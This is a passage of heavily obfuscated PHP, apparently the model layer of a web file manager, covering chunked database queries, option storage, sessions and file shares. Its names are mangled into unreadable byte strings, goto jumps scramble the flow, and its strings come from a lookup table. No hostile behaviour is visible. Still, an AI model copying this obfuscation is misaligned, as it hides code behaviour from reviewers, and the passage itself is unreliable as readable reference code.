DÁ†­ƒÄõ: if (empty($B“¤ÔË§‡)) { $this->error = think_lang($A×µÙæ¶ãš[267]); return !1; } $Aª—Ò§¥‘ = $this->_parseOptions($Aª—Ò§¥‘); foreach ($B“¤ÔË§‡ as $cò…¶Ÿôë– => $dÁ»§­Ôàâ) { $B“¤ÔË§‡[$cò…¶Ÿôë–] = $this->_facade($dÁ»§­Ôàâ); $this->_beforeInsert($B“¤ÔË§‡[$cò…¶Ÿôë–], $Aª—Ò§¥‘); } goto bäâ¹Ã ªÖ; bäâ¹Ã ªÖ: if (method_exists($this->db, $A×µÙæ¶ãš[268])) { for ($a¸³Ë‡œ‚ = 0; $a¸³Ë‡œ‚ < count($B“¤ÔË§‡); $a¸³Ë‡œ‚ += $BŞŒƒÕŸÖ) { $Aù²¤ñÊ·Æ = array_slice($B“¤ÔË§‡, $a¸³Ë‡œ‚, $BŞŒƒÕŸÖ); if (!is_array($Aù²¤ñÊ·Æ) || count($Aù²¤ñÊ·Æ) == 0) { break; } $Cš²…¼›¹ø = $this->db->insertAll($Aù²¤ñÊ·Æ, $Aª—Ò§¥‘, $aÊ…»¹Õã¹); $this->chunkEventCheck(count($Aù²¤ñÊ·Æ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($B“¤ÔË§‡ as $cò…¶Ÿôë– => $dÁ»§­Ôàâ) { $Cš²…¼›¹ø = $this->db->insert($dÁ»§­Ôàâ, $Aª—Ò§¥‘, $aÊ…»¹Õã¹); } $this->commit(); } if (!1 !== $Cš²…¼›¹ø) { $bØ…¼ù¼ˆÕ = $this->getLastInsID(); if ($bØ…¼ù¼ˆÕ) { return $bØ…¼ù¼ˆÕ; } } return $Cš²…¼›¹ø; goto c¬†Öœõ›·; F•†½Ãâ´°: $A×µÙæ¶ãš =& $_SERVER[ç]; ignore_timeout(); $BŞŒƒÕŸÖ = self::SQL_WHERE_IN_CHUNK; goto DÁ†­ƒÄõ; c¬†Öœõ›·: } public function save($BÁ¤¨Ú´ç¤ = '', $Eç•—î’øÊ = array()) { goto dİâÏÑØÔ; Eš´Û»Œí: for ($AÕ²…¾Õ¶ƒ = 0; $AÕ²…¾Õ¶ƒ < $E©ÛöÃÊãÕ; $AÕ²…¾Õ¶ƒ += $CÜ¤­ƒ„¹ ) { $b×¡ìÖ–Ø¾ = array_slice($DÍ­ã¿ÜÑ¶, $AÕ²…¾Õ¶ƒ, $CÜ¤­ƒ„¹ ); if (!is_array($b×¡ìÖ–Ø¾) || count($b×¡ìÖ–Ø¾) == 0) { break; } $CŞ×àğÀò[$B‚÷å›è˜’[271]][$a¦ğ‰²»æ—][1] = $b×¡ìÖ–Ø¾; $this->optionsValue($CŞ×àğÀò); $fÎÔ“ä• += parent::save($BÁ¤¨Ú´ç¤, $Eç•—î’øÊ); $this->chunkEventCheck(count($b×¡ìÖ–Ø¾)); } $this->chunkEventSet(); return $fÎÔ“ä•; goto dâµğ¼†¿š; dİâÏÑØÔ: $B‚÷å›è˜’ =& $_SERVER[ç]; $CÜ¤­ƒ„¹  = self::SQL_WHERE_IN_CHUNK; $CŞ×àğÀò = $this->optionsValue(); goto DÕİŠÍªÛî; cÀ•Ã¦–öÓ: $DÍ­ã¿ÜÑ¶ = $CŞ×àğÀò[$B‚÷å›è˜’[271]][$a¦ğ‰²»æ—][1]; $DÍ­ã¿ÜÑ¶ = is_array($DÍ­ã¿ÜÑ¶) ? $DÍ­ã¿ÜÑ¶ : array(); $E©ÛöÃÊãÕ = count($DÍ­ã¿ÜÑ¶); goto Eš´Û»Œí; DÕİŠÍªÛî: $a¦ğ‰²»æ— = $this->findWhereField($CŞ×àğÀò); if (!$a¦ğ‰²»æ—) { return parent::save($BÁ¤¨Ú´ç¤, $Eç•—î’øÊ); } $fÎÔ“ä• = 0; goto cÀ•Ã¦–öÓ; dâµğ¼†¿š: } public function add($dÆñÀ·ƒ = '', $DÎŸ–İ¤­ = array(), $eÑ­›«ö“ = false) { if ($this->addTaskStatus && is_array($dÆñÀ·ƒ)) { $this->addTaskData[] = $dÆñÀ·ƒ; return; } return parent::add($dÆñÀ·ƒ, $DÎŸ–İ¤­, $eÑ­›«ö“); } public function parseWhereLike($A¤‡° äŒ³, $C·»¾‡®…Ã = '', $A¾²¬ŞË = false, &$cî†ƒ·Œ°‰ = false) { goto bó¶ç—¼ô; DöŠ¼•„¿ö: foreach ($A¤‡° äŒ³ as $F—£ïöŒ => $bŠ‹­ª¹¾¢) { if (is_array($bŠ‹­ª¹¾¢) && count($bŠ‹­ª¹¾¢) == 2 && $bŠ‹­ª¹¾¢[0] == $a­øÔ†åïš[378] && is_string($bŠ‹­ª¹¾¢[1]) && substr($bŠ‹­ª¹¾¢[1], 0, 1) == $a­øÔ†åïš[379] && substr($bŠ‹­ª¹¾¢[1], strlen($bŠ‹­ª¹¾¢[1]) - 1, 1) == $a­øÔ†åïš[379]) { goto cƒÆ»»ÔÎ·; Bé°ôøµö„: $aŒ‰½Ö¦Î¦ = $this->db->escapeString($aŒ‰½Ö¦Î¦); if (!strpos($BÇîá¢°Ù, $a­øÔ†åïš[94])) { $BÇîá¢°Ù = $a­øÔ†åïš[380] . $BÇîá¢°Ù . $a­øÔ†åïš[380]; } if ($BØ¨ù—óî[$a­øÔ†åïš[381]]) { $aŒ‰½Ö¦Î¦ = $a­øÔ†åïš[115] . $aŒ‰½Ö¦Î¦ . $a­øÔ†åïš[115]; } goto fÆŒÎ¶–ï; cƒÆ»»ÔÎ·: $cî†ƒ·Œ°‰ = !0; $BÇîá¢°Ù = is_string($F—£ïöŒ) ? $F—£ïöŒ : $C·»¾‡®…Ã; $aŒ‰½Ö¦Î¦ = substr($bŠ‹­ª¹¾¢[1], 1, strlen($bŠ‹­ª¹¾¢[1]) - 2); goto Bé°ôøµö„; fÆŒÎ¶–ï: $AéËÖ©™†[$D´óŸâåì¦] = $a­øÔ†åïš[382] . $BÇîá¢°Ù . $a­øÔ†åïš[383] . $aŒ‰½Ö¦Î¦ . $a­øÔ†åïš[384]; $D´óŸâåì¦++; continue; goto AØ¹°îìè; AØ¹°îìè: } if (is_array($bŠ‹­ª¹¾¢)) { $C·»¾‡®…Ã = is_string($F—£ïöŒ) ? $F—£ïöŒ : $C·»¾‡®…Ã; $bŠ‹­ª¹¾¢ = $this->parseWhereLike($bŠ‹­ª¹¾¢, $C·»¾‡®…Ã, !0, $cî†ƒ·Œ°‰); } if (is_numeric($F—£ïöŒ)) { $AéËÖ©™†[$D´óŸâåì¦] = $bŠ‹­ª¹¾¢; $D´óŸâåì¦++; } else { $AéËÖ©™†[$F—£ïöŒ] = $bŠ‹­ª¹¾¢; } } if ($cî†ƒ·Œ°‰ && !$A¾²¬ŞË) { trace_log(array($AéËÖ©™†, $A¤‡° äŒ³), $a­øÔ†åïš[271]); } return $AéËÖ©™†; goto f‹ñ©º‚ê; bó¶ç—¼ô: $a­øÔ†åïš =& $_SERVER[ç]; $BØ¨ù—óî = $GLOBALS[$a­øÔ†åïš[6]][$a­øÔ†åïš[376]]; if (!$BØ¨ù—óî[$a­øÔ†åïš[377]]) { return $A¤‡° äŒ³; } goto AíëÉ‚ì; AíëÉ‚ì: if (!is_array($A¤‡° äŒ³)) { return $A¤‡° äŒ³; } $AéËÖ©™† = array(); $D´óŸâåì¦ = 0; goto DöŠ¼•„¿ö; f‹ñ©º‚ê: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($AĞõ³±£Ğ® = array()) { goto AôŠ”°ª¢õ; AôŠ”°ª¢õ: $E”Èñ‡ÍŠœ =& $_SERVER[ç]; $fÔ¤ƒ†âç½ = self::SQL_WHERE_IN_CHUNK; $e©Øâ‹§Ëª = $this->optionsValue(); goto FÌ¬˜Â—å„; AÆÆ­‘ÇÂ: return $b‘ÓÜ‰îßì; goto Dğº‰¦¹­ò; FÌ¬˜Â—å„: $cæ¥ß‹¶ÅÃ = $this->findWhereField($e©Øâ‹§Ëª); if (!$cæ¥ß‹¶ÅÃ || isset($e©Øâ‹§Ëª[$E”Èñ‡ÍŠœ[288]]) || isset($e©Øâ‹§Ëª[$E”Èñ‡ÍŠœ[349]])) { return parent::select($AĞõ³±£Ğ®); } $B„‘°ŒÄ× = $e©Øâ‹§Ëª[$E”Èñ‡ÍŠœ[271]][$cæ¥ß‹¶ÅÃ][1]; goto cóöÏ÷°ï; cóöÏ÷°ï: $B„‘°ŒÄ× = is_array($B„‘°ŒÄ×) ? $B„‘°ŒÄ× : array(); $b‘ÓÜ‰îßì = null; for ($aÎÈ½®Ù”ß = 0; $aÎÈ½®Ù”ß < count($B„‘°ŒÄ×); $aÎÈ½®Ù”ß += $fÔ¤ƒ†âç½) { $b·¸ÂÅáÉ = array_slice($B„‘°ŒÄ×, $aÎÈ½®Ù”ß, $fÔ¤ƒ†âç½); if (!is_array($b·¸ÂÅáÉ) || count($b·¸ÂÅáÉ) == 0) { break; } $e©Øâ‹§Ëª[$E”Èñ‡ÍŠœ[271]][$cæ¥ß‹¶ÅÃ][1] = $b·¸ÂÅáÉ; $this->optionsValue($e©Øâ‹§Ëª); $EË˜Ÿ”Îæğ = parent::select($AĞõ³±£Ğ®); if (!$EË˜Ÿ”Îæğ) { continue; } if (is_null($b‘ÓÜ‰îßì)) { $b‘ÓÜ‰îßì = array(); } $b‘ÓÜ‰îßì = array_merge($b‘ÓÜ‰îßì, $EË˜Ÿ”Îæğ); } goto AÆÆ­‘ÇÂ; Dğº‰¦¹­ò: } public function delete($fÜ×Š²Âî = array()) { goto bÇ³„ÌŒãŞ; E¬Êš’½Œ: return $dŸ’½µ†ÇÛ; goto C‰¾±ç†Êó; bÇ³„ÌŒãŞ: $cÑ•‚†Ë±Î =& $_SERVER[ç]; $c°Ã ©¾ = self::SQL_WHERE_IN_CHUNK; $B‡ƒ×ùõš£ = $this->optionsValue(); goto dˆ´È‡ï¢‹; dˆ´È‡ï¢‹: $d„êîôá— = $this->findWhereField($B‡ƒ×ùõš£); if (!$d„êîôá—) { return parent::delete($fÜ×Š²Âî); } $dŸ’½µ†ÇÛ = 0; goto d÷ÑŒ ¹‚; d÷ÑŒ ¹‚: $Aä”èƒÖ› = $B‡ƒ×ùõš£[$cÑ•‚†Ë±Î[271]][$d„êîôá—][1]; $Aä”èƒÖ› = is_array($Aä”èƒÖ›) ? $Aä”èƒÖ› : array(); for ($A‚·»„ïî = 0; $A‚·»„ïî < count($Aä”èƒÖ›); $A‚·»„ïî += $c°Ã ©¾) { $a”ã±Û¯İî = array_slice($Aä”èƒÖ›, $A‚·»„ïî, $c°Ã ©¾); if (!is_array($a”ã±Û¯İî) || count($a”ã±Û¯İî) == 0) { break; } $B‡ƒ×ùõš£[$cÑ•‚†Ë±Î[271]][$d„êîôá—][1] = $a”ã±Û¯İî; $this->optionsValue($B‡ƒ×ùõš£); $dŸ’½µ†ÇÛ += parent::delete($fÜ×Š²Âî); } goto E¬Êš’½Œ; C‰¾±ç†Êó: } private function findWhereField($EÅ”­ ¥’²) { $D Û–àÇ‡ =& $_SERVER[ç]; $A‡İ¡ôßÌ… = self::SQL_WHERE_IN_CHUNK; if (!is_array($EÅ”­ ¥’²) || !is_array($EÅ”­ ¥’²[$D Û–àÇ‡[271]])) { return !1; } foreach ($EÅ”­ ¥’²[$D Û–àÇ‡[271]] as $C§ÕôĞ„™Õ => $D¿ôíçÙ™Ô) { if (is_array($D¿ôíçÙ™Ô) && isset($D¿ôíçÙ™Ô[0]) && is_string($D¿ôíçÙ™Ô[0]) && strtolower($D¿ôíçÙ™Ô[0]) == $D Û–àÇ‡[7] && is_array($D¿ôíçÙ™Ô[1]) && count($D¿ôíçÙ™Ô[1]) > $A‡İ¡ôßÌ…) { ignore_timeout(); return $C§ÕôĞ„™Õ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\x65\155\117\x70\x74\x69\x6f\x6e"; public $field = array(); public function listData($aÕ½–Ì—Å = false, $e‰ŠÃÜ¸³ = "\155\157\x64\x69\146\x79\x54\x69\x6d\x65", $AªËÑôø×Í = false) { $A…ä¶è¥ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$A…ä¶è¥) { return $aÕ½–Ì—Å ? null : array(); } if (!$aÕ½–Ì—Å) { $A…ä¶è¥ = array_filter(array_values($A…ä¶è¥)); return array_sort_by($A…ä¶è¥, $e‰ŠÃÜ¸³, $AªËÑôø×Í); } return $A…ä¶è¥[$_SERVER[ç][385] . $aÕ½–Ì—Å]; } public function insert($c¹–»®á) { goto fÍ­øƒğŞ; d†Û±ÊåÖ: return $A®…´ÄÀõæ; goto DèÑÅêª®À; e®á¯Üªãˆ: $A®…´ÄÀõæ = $A®…´ÄÀõæ ? $A®…´ÄÀõæ : 0; $c¹–»®á[$Eâº‰Âî¸Á[388]] = ++$A®…´ÄÀõæ; $c¹–»®á[$Eâº‰Âî¸Á[192]] = time(); goto E× ‡‡‰Áá; fÍ­øƒğŞ: $Eâº‰Âî¸Á =& $_SERVER[ç]; $c¹–»®á = array_field_key($c¹–»®á, $this->field); $A®…´ÄÀõæ = Model($this->modelType)->get($Eâº‰Âî¸Á[386], $this->optionType . $Eâº‰Âî¸Á[387]); goto e®á¯Üªãˆ; E× ‡‡‰Áá: $c¹–»®á[$Eâº‰Âî¸Á[83]] = time(); Model($this->modelType)->set($Eâº‰Âî¸Á[386], $A®…´ÄÀõæ, $this->optionType . $Eâº‰Âî¸Á[387]); Model($this->modelType)->set($Eâº‰Âî¸Á[385] . $A®…´ÄÀõæ, $c¹–»®á, $this->optionType); goto d†Û±ÊåÖ; DèÑÅêª®À: } public function update($EØ©¼ß´Ó˜, $BÀÕõ¬¾Ù) { goto fõÀÑÜ“ˆ; fõÀÑÜ“ˆ: $bÙ§Ì‹¢¶´ =& $_SERVER[ç]; $BÀÕõ¬¾Ù = array_field_key($BÀÕõ¬¾Ù, $this->field); $CĞ¡œ“Š = $this->listData($EØ©¼ß´Ó˜); goto cäÇ“…Œ Â; cäÇ“…Œ Â: if (!$CĞ¡œ“Š) { return !1; } $BÀÕõ¬¾Ù = array_merge($CĞ¡œ“Š, $BÀÕõ¬¾Ù); $BÀÕõ¬¾Ù[$bÙ§Ì‹¢¶´[83]] = time(); goto EàÒÊĞ‘Àª; EàÒÊĞ‘Àª: return Model($this->modelType)->set($bÙ§Ì‹¢¶´[385] . $EØ©¼ß´Ó˜, $BÀÕõ¬¾Ù, $this->optionType); goto dŞä‘µ÷“®; dŞä‘µ÷“®: } public function remove($C‰„ŒÈÀºì) { return Model($this->modelType)->remove($_SERVER[ç][385] . $C‰„ŒÈÀºì, $this->optionType); } public function clear() { $b¼§Ë©Íµ =& $_SERVER[ç]; Model($this->modelType)->remove($b¼§Ë©Íµ[386], $this->optionType . $b¼§Ë©Íµ[387]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($eğè¬ãì­, $B•óò¯ù†ä) { if (!$B•óò¯ù†ä) { return !1; } $Bİ®‘ä™å = $this->listData(); $Bİ®‘ä™å = array_to_keyvalue($Bİ®‘ä™å, $eğè¬ãì­); return isset($Bİ®‘ä™å[$B•óò¯ù†ä]) ? $Bİ®‘ä™å[$B•óò¯ù†ä] : !1; } public function findByName($Dôƒ¤ò§¾á) { return $this->findByKey($_SERVER[ç][28], $Dôƒ¤ò§¾á); } protected function resetData($EŠäÚöÓ) { $dêà¿ñÖÑ• =& $_SERVER[ç]; $EŠäÚöÓ = is_array($EŠäÚöÓ) ? $EŠäÚöÓ : array(); $b–¹µ¸ˆˆÍ = array(); for ($cå¼‘‡‘Ô‰ = 0; $cå¼‘‡‘Ô‰ < count($EŠäÚöÓ); $cå¼‘‡‘Ô‰++) { $b–¹µ¸ˆˆÍ[$dêà¿ñÖÑ•[385] . $EŠäÚöÓ[$cå¼‘‡‘Ô‰][$dêà¿ñÖÑ•[388]]] = $EŠäÚöÓ[$cå¼‘‡‘Ô‰]; } return Model($this->modelType)->set($b–¹µ¸ˆˆÍ, !1, $this->optionType); } private function getAutoName($CéÃíª‘ë¾) { $d‰³©ˆ—™¨ = array_to_keyvalue($this->listData(), $_SERVER[ç][28]); if (!$d‰³©ˆ—™¨ || !isset($d‰³©ˆ—™¨[$CéÃíª‘ë¾])) { return $CéÃíª‘ë¾; } for ($D¬°Ã‹“İò = 1; $D¬°Ã‹“İò < count($d‰³©ˆ—™¨); $D¬°Ã‹“İò++) { $eÚ‰”ˆ’ÚË = $CéÃíª‘ë¾ . "\x28{$D¬°Ã‹“İò}\51"; if (!isset($d‰³©ˆ—™¨[$eÚ‰”ˆ’ÚË])) { return $eÚ‰”ˆ’ÚË; } } return $eÚ‰”ˆ’ÚË; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($e•åùšÇ¬Ä = false, $Eë‰‚ãñÈ™ = '', $eĞÏ…ÆŒœ = false) { goto aÓ£îîİ®; EÄÂ¼“ Ã„: $this->cacheSet($Eë‰‚ãñÈ™, $Bˆ‰‹’Ùö­); $Bˆ‰‹’Ùö­ = array_merge($Cßİ£¦Îº®, $Bˆ‰‹’Ùö­); return $e•åùšÇ¬Ä ? $Bˆ‰‹’Ùö­[$e•åùšÇ¬Ä] : $Bˆ‰‹’Ùö­; goto BÆ‘Ç÷Ì‡; e…Üå›Íß©: $Bˆ‰‹’Ùö­ = $this->where($e…ÆôË”‹)->select(); $Bˆ‰‹’Ùö­ = array_to_keyvalue($Bˆ‰‹’Ùö­, $F´Š¾ÓÙéÔ[92], $F´Š¾ÓÙéÔ[370]); foreach ($Bˆ‰‹’Ùö­ as $F—¯äÊåàÖ => $fãËŠ˜øÑ) { if ($eĞÏ…ÆŒœ || in_array($F—¯äÊåàÖ, $this->jsonField)) { $Bˆ‰‹’Ùö­[$F—¯äÊåàÖ] = json_decode($fãËŠ˜øÑ, !0); } } goto EÄÂ¼“ Ã„; eÜŸ–ò–Ÿğ: $Cßİ£¦Îº® = is_array($Cßİ£¦Îº®) ? $Cßİ£¦Îº® : array(); if (is_array($Bˆ‰‹’Ùö­)) { $Bˆ‰‹’Ùö­ = array_merge($Cßİ£¦Îº®, $Bˆ‰‹’Ùö­); return $e•åùšÇ¬Ä ? isset($Bˆ‰‹’Ùö­[$e•åùšÇ¬Ä]) ? $Bˆ‰‹’Ùö­[$e•åùšÇ¬Ä] : null : $Bˆ‰‹’Ùö­; } $e…ÆôË”‹ = $this->filterWhere(array($F´Š¾ÓÙéÔ[29] => $Eë‰‚ãñÈ™)); goto e…Üå›Íß©; aÓ£îîİ®: $F´Š¾ÓÙéÔ =& $_SERVER[ç]; $Bˆ‰‹’Ùö­ = $this->cacheGet($Eë‰‚ãñÈ™); $Cßİ£¦Îº® = $this->optionDefault($Eë‰‚ãñÈ™); goto eÜŸ–ò–Ÿğ; BÆ‘Ç÷Ì‡: } public function set($Fç«ªİò‰–, $AÌ¤ìŞÙøÇ = false, $CÄŸ—ŠßÈ = '') { goto eµ‡Í¡«‹; eµ‡Í¡«‹: $fÖÅÄé¨Æ÷ =& $_SERVER[ç]; $this->cacheRemove($CÄŸ—ŠßÈ); $e¸çâ„«Ô« = array(); goto D÷§Š³Ö÷¹; Eë†õŠšÅ«: return $this->addAll($e¸çâ„«Ô«, array(), !0); goto CìÍùçŞªÀ; D÷§Š³Ö÷¹: $eÍî­„©î´ = is_array($Fç«ªİò‰–) ? $Fç«ªİò‰– : array($Fç«ªİò‰– => $AÌ¤ìŞÙøÇ); foreach ($eÍî­„©î´ as $aíÛáÆõ¨É => $F¼ãİÙà) { if (is_array($F¼ãİÙà)) { $F¼ãİÙà = json_encode_force($F¼ãİÙà); } $this->checkLength($F¼ãİÙà, !1, $this->tableName . $fÖÅÄé¨Æ÷[4] . $Fç«ªİò‰–); $F¼ãİÙà = self::textEncode($F¼ãİÙà); $eÍî­„©î´ = array($fÖÅÄé¨Æ÷[29] => $CÄŸ—ŠßÈ, $fÖÅÄé¨Æ÷[92] => $aíÛáÆõ¨É, $fÖÅÄé¨Æ÷[370] => $F¼ãİÙà); $e¸çâ„«Ô«[] = $this->filterWhere($eÍî­„©î´); } if (!$e¸çâ„«Ô«) { return !0; } goto Eë†õŠšÅ«; CìÍùçŞªÀ: } protected function optionDefault($eé¦Üçšã = '') { return !1; } public function setDeep($B»©’ÑÄ“, $B¹¼ª á”Í = false, $aø¸ ô™Ò” = '') { $F‹§„ÌÔ‘» = explode($_SERVER[ç][94], $B»©’ÑÄ“); $dÒ«÷ÏÑÄ = $this->get(); array_set_value($dÒ«÷ÏÑÄ, $B»©’ÑÄ“, $B¹¼ª á”Í); $this->set($F‹§„ÌÔ‘»[0], $dÒ«÷ÏÑÄ[$F‹§„ÌÔ‘»[0]], $aø¸ ô™Ò”); } public function remove($Cá‡Æ‚Ÿ³ï, $CÖµˆ¤†Ò = '') { $e×ŸÂçË¥ =& $_SERVER[ç]; $this->cacheRemove($CÖµˆ¤†Ò); $c¸ËÙèÈ = $this->filterWhere(array($e×ŸÂçË¥[92] => $Cá‡Æ‚Ÿ³ï, $e×ŸÂçË¥[29] => $CÖµˆ¤†Ò)); if (is_null($Cá‡Æ‚Ÿ³ï)) { unset($c¸ËÙèÈ[$e×ŸÂçË¥[92]]); } return $this->where($c¸ËÙèÈ)->delete(); } public function cacheSet($a¦Û…é‘ø†, $D½Œ³ôƒ‹Ô = false) { return Cache::set($this->cacheKey($a¦Û…é‘ø†), $D½Œ³ôƒ‹Ô); } public function cacheGet($d¹¶È×¡•å) { return Cache::get($this->cacheKey($d¹¶È×¡•å)); } public function cacheRemove($d·Æ¸˜®ƒ¯) { return Cache::remove($this->cacheKey($d·Æ¸˜®ƒ¯)); } protected function filterWhere($f¦ªÜ“¦¡„) { return $f¦ªÜ“¦¡„; } protected function cacheKey($AÍº¥Ç ŞÌ) { return $AÍº¥Ç ŞÌ; } } goto Eàïõ†ä¡Û; BÙÏ²ÕÀù: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\137\163\x65\163\163\151\157\156"; public function get($c„Õ£ÚÅğŒ) { $eª›ç“Ùëø =& $_SERVER[ç]; $b‚¡ÀöéŠ = $this->where(array($eª›ç“Ùëø[1779] => $c„Õ£ÚÅğŒ))->find(); if (!is_array($b‚¡ÀöéŠ)) { return !1; } return $b‚¡ÀöéŠ[$eª›ç“Ùëø[698]]; } public function set($Có³šæùÓ¾, $D¬‡ÇŞÂÄõ, $E˜öŞ¥–ñŞ = 3600) { $EÒ‘×£ƒ‰… =& $_SERVER[ç]; $dÊù˜Û”¨Œ = array($EÒ‘×£ƒ‰…[1779] => $Có³šæùÓ¾, $EÒ‘×£ƒ‰…[1687] => $D¬‡ÇŞÂÄõ, $EÒ‘×£ƒ‰…[1780] => $E˜öŞ¥–ñŞ + time()); if (Session::get($EÒ‘×£ƒ‰…[1781])) { $dÊù˜Û”¨Œ[$EÒ‘×£ƒ‰…[1491]] = Session::get($EÒ‘×£ƒ‰…[1781]); } else { $dÊù˜Û”¨Œ[$EÒ‘×£ƒ‰…[1491]] = 0; } if ($this->get($Có³šæùÓ¾)) { return $this->where(array($EÒ‘×£ƒ‰…[1779] => $Có³šæùÓ¾))->save($dÊù˜Û”¨Œ); } else { return $this->add($dÊù˜Û”¨Œ, array(), !0); } } public function remove($f¤ËÕƒ÷) { return $this->where(array($_SERVER[ç][1779] => $f¤ËÕƒ÷))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ç][1782] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\151\155\145", "\x74\151\155\145", "\151\156\163\145\x72\x74\54\165\160\144\x61\x74\x65", "\x66\x75\x6e\143\x74\151\x6f\156"), array("\143\162\x65\141\x74\x65\x54\151\155\145", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74", "\146\x75\x6e\143\x74\151\x6f\156"), array("\157\160\x74\151\x6f\156\163", '', "\x69\x6e\163\x65\x72\x74\x2c\x75\x70\144\141\164\x65\x2c\163\145\154\x65\x63\x74", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Aä¼½öƒ«˜) { $DÍèÆÔõ“Ë =& $_SERVER[ç]; $DÜİàµÌØ = isset($Aä¼½öƒ«˜[0]) ? $Aä¼½öƒ«˜[0] : !1; return array($DÍèÆÔõ“Ë[1783] => array(USER_ID, $DÍèÆÔõ“Ë[1784]), $DÍèÆÔõ“Ë[1727] => array($DÜİàµÌØ, $DÍèÆÔõ“Ë[1785])); } protected function listSimple() { $cšÍ‰˜¹À = array($_SERVER[ç][1491] => USER_ID); $eµ­¤ÊÛå = $this->field($this->fieldList)->where($cšÍ‰˜¹À)->select(); return $eµ­¤ÊÛå ? $eµ­¤ÊÛå : array(); } protected function getInfo($e•ê—»ÇÀ“, $a˜îªƒŠ˜º = false) { $D›‰¦ÀÍÂ  =& $_SERVER[ç]; if ($a˜îªƒŠ˜º) { return $this->_getShareInfo(array($D›‰¦ÀÍÂ [462] => $e•ê—»ÇÀ“)); } $dß™À¨ÎÆ¦ = $this->cacheFunctionGet($D›‰¦ÀÍÂ [1734], $e•ê—»ÇÀ“); return $dß™À¨ÎÆ¦; } public function getInfoByHash($BÏÔ¿‹‹Ü) { return $this->_getShareInfo(array($_SERVER[ç][464] => $BÏÔ¿‹‹Ü)); } public function getInfoByPath($cô´æ‚êƒ‘) { $DÅ²“„»¥‰ =& $_SERVER[ç]; $dŒöš³’‚ = array($DÅ²“„»¥‰[1491] => USER_ID, $DÅ²“„»¥‰[390] => $cô´æ‚êƒ‘); return $this->_getShareInfo($dŒöš³’‚); } public function getInfoBySourcePath($Cá¤‰êÅ»µ) { $b‹İÎµÈÌà =& $_SERVER[ç]; $fùØ¨åÚ˜¥ = array($b‹İÎµÈÌà[1491] => USER_ID, $b‹İÎµÈÌà[1038] => $Cá¤‰êÅ»µ); return $this->_getShareInfo($fùØ¨åÚ˜¥); } private function _getShareInfo($dä®Ùª¿ƒÌ) { goto e½‡”Ü×á™; aÈ¼¨™Ûƒ: $dä®Ùª¿ƒÌ = array($DÑº¦—ñŠ[462] => $BÍ—Ü¼ç£ï[$DÑº¦—ñŠ[462]]); $Aƒ¶Ê”áÑ = $DÑº¦—ñŠ[1786]; $FˆÉñö‰ˆÃ = Model($DÑº¦—ñŠ[559])->order($DÑº¦—ñŠ[388])->field($Aƒ¶Ê”áÑ)->where($dä®Ùª¿ƒÌ)->select(); goto a¦‚‹èà“™; a¦‚‹èà“™: if ($BÍ—Ü¼ç£ï[$DÑº¦—ñŠ[390]] == $DÑº¦—ñŠ[491]) { $BÍ—Ü¼ç£ï[$DÑº¦—ñŠ[84]] = IO::info($BÍ—Ü¼ç£ï[$DÑº¦—ñŠ[1038]]); } else { $BÍ—Ü¼ç£ï[$DÑº¦—ñŠ[84]] = Model($DÑº¦—ñŠ[1171])->pathInfo($BÍ—Ü¼ç£ï[$DÑº¦—ñŠ[390]]); } $BÍ—Ü¼ç£ï[$DÑº¦—ñŠ[1787]] = $FˆÉñö‰ˆÃ; return $BÍ—Ü¼ç£ï; goto DÇâ›ŠÈ; e½‡”Ü×á™: $DÑº¦—ñŠ =& $_SERVER[ç]; $BÍ—Ü¼ç£ï = $this->where($dä®Ùª¿ƒÌ)->find(); if (!$BÍ—Ü¼ç£ï) { return !1; } goto aÈ¼¨™Ûƒ; DÇâ›ŠÈ: } protected function getInfoAuth($dš‹¼º–·½) { $AÅÌóÀ–— =& $_SERVER[ç]; $dŞœ¾¾«ˆÍ = $this->getInfo($dš‹¼º–·½); $dŞœ¾¾«ˆÍ[$AÅÌóÀ–—[400]] = Model($AÅÌóÀ–—[476])->authMake($dŞœ¾¾«ˆÍ[$AÅÌóÀ–—[1787]]); return $dŞœ¾¾«ˆÍ; } protected function listData($AÍ¬éĞÔÔ„ = null, $dƒ„™ùº³‰ = 300) { $DËîÃØ††” =& $_SERVER[ç]; $d µªÏÒÂ = array(array($DËîÃØ††”[467] => array($DËîÃØ††”[937], 0), $DËîÃØ††”[469] => array($DËîÃØ††”[937], 0), $DËîÃØ††”[1788] => $DËîÃØ††”[1742])); if ($AÍ¬éĞÔÔ„ == $DËîÃØ††”[1789]) { $d µªÏÒÂ = array($DËîÃØ††”[467] => 1); } else { if ($AÍ¬éĞÔÔ„ == $DËîÃØ††”[1023]) { $d µªÏÒÂ = array($DËîÃØ††”[469] => 1); } } $d µªÏÒÂ[$DËîÃØ††”[1491]] = USER_ID; $d’ØØĞì‘ = $this->where($d µªÏÒÂ)->selectPage($dƒ„™ùº³‰); return $d’ØØĞì‘; } protected function listToMe($BÙ‚ÉÄé†ñ = 300) { goto FÔŸßùÊÌ´; b©†à½‘”›: $Fİ„ŸÀŒÄã = $this->field($AøÓŒÅù©Ù)->where($aÒ‚Ÿä«º)->select(); foreach ($Fİ„ŸÀŒÄã as $Bô‡Â³÷Ø => &$E î­“†ï„) { $E î­“†ï„[$C®òÌÂè•ï[1787]] = $FĞ×©³©ö[$E î­“†ï„[$C®òÌÂè•ï[462]]]; } unset($E î­“†ï„); goto fˆ²Šº‰Ø¢; a¦Õù÷î³”: if (!$FĞ×©³©ö) { return $E¾Ñ¨áÕÛ; } $AøÓŒÅù©Ù = $C®òÌÂè•ï[1791]; $aÒ‚Ÿä«º = array($C®òÌÂè•ï[462] => array($C®òÌÂè•ï[405], array_keys($FĞ×©³©ö))); goto b©†à½‘”›; 